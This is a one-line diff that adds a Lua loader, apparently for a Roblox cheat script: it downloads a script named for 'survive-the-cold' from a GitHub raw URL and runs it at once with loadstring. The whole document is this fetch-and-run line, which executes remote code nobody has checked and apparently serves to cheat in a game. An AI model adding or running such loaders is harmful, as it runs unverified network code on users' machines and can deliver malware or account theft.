@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/survive-the-cold-spam7-lur43fnmoc0crl.lua"))()
